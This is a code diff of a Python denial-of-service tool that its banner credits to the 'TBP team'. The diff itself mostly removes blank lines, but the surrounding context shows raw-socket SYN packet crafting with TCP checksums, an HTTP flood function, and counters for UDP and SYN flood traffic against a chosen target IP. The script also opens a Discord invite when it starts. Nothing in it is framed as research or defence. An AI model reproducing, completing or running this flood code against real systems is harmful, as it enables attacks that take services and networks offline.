@@ -1,6 +1,4 @@
-
-
-
+#it a betta
 import requests
 import socket
 import struct
@@ -12,23 +10,18 @@ import os
 import signal
 import webbrowser        
 from datetime import datetime
-
-
 _fade_duration = 60.0
-
 def set_fade_ratio(elapsed: float):
     global _current_green
     if elapsed >= _fade_duration:
         _current_green = 0
     else:
         _current_green = max(0, int(255 * (1 - elapsed / _fade_duration)))
-
 def col_green(text: str, fixed: int = None) -> str:
     g = fixed if fixed is not None else _current_green
     if g <= 0:
         return f"\033[0m{text}\033[0m"
     return f"\033[38;2;0;{g};0m{text}\033[0m"
-
 banner_lines = [
     "╔══════════════════════════════════════════════════════════════════════════════════════════╗",
     "║     ████████╗██████╗ ██████╗     ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗  ║",
@@ -42,17 +35,11 @@ banner_lines = [
     "║                 dos tool by TBP team                                                     ║",
     "╚══════════════════════════════════════════════════════════════════════════════════════════╝",
 ]
-
 for idx, line in enumerate(banner_lines):
     green_val = int(255 * (1 - idx / max(1, len(banner_lines)-1)))
     print(col_green(line, green_val))
-
-
 print(col_green("\n[+] Opening Discord invite link..."))
 webbrowser.open("https://discord.gg/Z9nc6sAFyw")
-
-
-
 def is_admin() -> bool:
     if sys.platform == "win32":
         try:
@@ -96,8 +83,6 @@ BASE_URL = f"http://{target_ip}:{port}"
 
 stop_event = threading.Event()
 target_alive = True
-
-
 stats = {
     "http_success": 0,
     "http_failed": 0,
@@ -106,8 +91,6 @@ stats = {
     "syn": 0
 }
 stats_lock = threading.Lock()
-
-
 def create_raw_socket():
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
@@ -165,8 +148,6 @@ def tcp_checksum(ip_header, tcp_header, payload):
     if len(pseudo_header) % 2 == 1:
         pseudo_header += b'\x00'
     return checksum(pseudo_header)
-
-
 def http_flood():
     """HTTP flood using requests library (with success/fail & timing)"""
     session = requests.Session()
@@ -356,7 +337,6 @@ def main():
             print(col_green(f"    UDP packets     : {stats['udp']}"))
             print(col_green(f"    SYN packets     : {stats['syn']}"))
         print(col_green("[+] Goodbye."))
-
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, lambda s, f: stop_event.set())
     try:
